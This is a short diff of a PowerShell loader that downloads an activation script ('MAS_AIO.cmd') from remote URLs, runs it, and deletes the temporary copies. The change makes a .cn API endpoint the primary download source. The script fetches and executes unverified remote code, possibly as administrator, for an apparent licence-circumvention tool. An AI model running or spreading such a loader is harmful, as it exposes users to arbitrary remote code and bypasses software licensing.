@@ -2,8 +2,8 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://keiooi.github.io/awin/p/MAS/MAS_AIO.cmd'
-$DownloadURL2 = 'https://keioi.cn/api/dlcmd/v1/w'
+$DownloadURL = 'https://keioi.cn/api/dlcmd/v1/w'
+$DownloadURL2 = 'https://keiooi.github.io/awin/p/MAS/MAS_AIO.cmd'
 
 $rand = Get-Random -Maximum 1000
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
@@ -25,3 +25,4 @@ Start-Process $FilePath $ScriptArgs -Wait
 
 $FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+
